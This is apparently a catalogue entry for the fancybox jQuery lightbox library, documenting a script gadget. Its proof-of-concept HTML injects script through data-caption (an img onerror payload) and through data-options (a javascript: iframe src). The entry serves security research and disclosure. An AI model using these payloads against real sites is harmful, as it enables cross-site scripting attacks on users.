---
description: jQuery lightbox script for displaying images, videos and more.
github: fancyapps/fancybox
gadgets:
  Latest:
    authors:
      - github:hrtode99
    tags:
      - any-tag
      - data-attr
      - any-timing
      - chrome-browser
      - firefox-browser
      - safari-browser
    pocs:
      - description: fancybox uses HTML from the `data-caption` attribute. It also accepts various options from the `data-options` attribute.
        code: |
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <link href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.css" rel="stylesheet" />
          <script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.js"></script>
          <a data-fancybox="gallery" data-caption="&lt;img src=x onerror=&quot;alert()&quot;&gt;" href="https://example.com/">Click me</a>
          <a data-fancybox="image" data-options='{"type" : "iframe", "src": "javascript:alert()"}' href="https://example.com/">Click me</a>
    links:
      - https://github.com/fancyapps/ui/issues/826
---
